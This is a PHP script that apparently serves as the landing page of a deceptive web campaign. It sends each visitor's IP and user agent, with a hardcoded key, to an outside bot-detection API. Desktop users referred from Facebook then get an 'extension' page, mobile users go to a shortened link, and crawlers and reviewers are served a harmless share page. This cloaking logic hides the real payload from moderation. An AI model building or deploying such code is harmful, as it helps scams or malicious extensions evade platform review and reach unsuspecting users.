<?php

require_once("config.php");
require_once("includes/functions.php");


function getIpAddress() {
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipAddresses = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim(end($ipAddresses));
    }
    else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_URL => 'http://tracking.redirect.pub/api/isBot?api_key=51fa5653d1986420acfc567f4a9826ac&i='.getIpAddress().'&u='.$_SERVER["HTTP_USER_AGENT"]
));
$api = curl_exec($ch);
curl_close($ch);
$isref = false;


$data = json_decode($api);

$theme = "none";
$mobile = "https://goo.gl/936AdQ";

if (strpos($_SERVER["HTTP_REFERER"], 'facebook.com') !== false){
    $isref = true;
}
if (strpos($_SERVER["HTTP_REFERER"], 'herokuapp.com') !== false){
    $isref = true;
}

if ($data->status == "true" && $data->device_type == "desktop" && $isref == true) {

  $theme = "extension";

}

if ($data->status == "true" && $data->device_type == "mobile") {

  $theme = "mobile";

}

if ($theme == "extension") {

  if(strpos($_SERVER["HTTP_HOST"], $app_site) === false){
    header("Location: http://".$app_site."/".rand(1000000, 999999999));
  } else {
    require_once('extension.php');
  }
  exit;

} else if ($theme == "mobile") {

  header("Location: ".$mobile);
  exit;

} else {
  header("HTTP/1.1 301");

  require_once('share.php');
  exit;
}
?>
